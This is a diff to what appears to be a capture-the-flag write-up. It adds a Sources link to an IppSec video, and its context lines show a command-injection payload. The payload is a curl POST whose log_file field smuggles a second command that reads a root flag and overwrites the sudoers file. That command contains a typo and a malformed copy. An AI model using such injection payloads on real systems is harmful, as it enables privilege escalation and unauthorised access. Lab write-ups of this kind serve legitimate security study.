@@ -63,5 +63,6 @@ Then just use browser to check the web page
 So there would be a command injection  and this is our payload:
 `curl -X POST 'http://localhost:80/' -d "log_file=/root/root.txt;cp /dev/shm/sudoers > /etc/suoders&analyze_log="
 
+## Fuentes / Sources
 
-
+- [IppSec: Sea (video)](https://youtube.com/watch?v=eXTQ3z7esjQ) - IppSec - fecha de acceso: 2026-09-24.
